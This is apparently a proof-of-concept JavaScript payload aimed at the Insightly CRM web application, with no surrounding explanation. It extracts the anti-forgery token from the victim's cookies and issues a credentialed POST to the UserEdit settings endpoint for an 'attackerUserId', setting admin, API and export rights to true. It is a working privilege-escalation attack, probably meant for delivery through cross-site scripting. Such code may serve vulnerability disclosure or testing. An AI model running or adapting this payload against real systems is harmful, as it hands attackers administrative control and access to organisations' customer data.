var token=document.cookie.split('; ').find(row=>row.startsWith('__CustomRequestVerificationToken_FormFieldToken')).split('=')[1];
var attackerUserId = "123123"
fetch(`https://crm.na1.insightly.com/Settings/UserEdit/${attackerUserId}`, {
  'headers': {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
  },
  'referrer': 'https://crm.na1.insightly.com/Settings/UserEdit/2211902',
  'referrerPolicy': 'strict-origin-when-cross-origin',
  'body': `FirstName=Name&LastName=Surname&IsAdmin=true&IsAdmin=false&ApiAccess=true&ApiAccess=false&CanExport=true&CanExport=false&ProductUserLicenses%5BCRM_SUBSCRIPTION%5D=true&ProductUserLicenses%5BCRM_SUBSCRIPTION%5D=false&TimeZoneId=Central+Standard+Time&Currency=USD&DefaultAddressCountry=United+States&PreferredLanguage=en-US&submit=&__CustomRequestVerificationToken=${token}`,
  'method': 'POST',
  'mode': 'cors',
  'credentials': 'include'
});
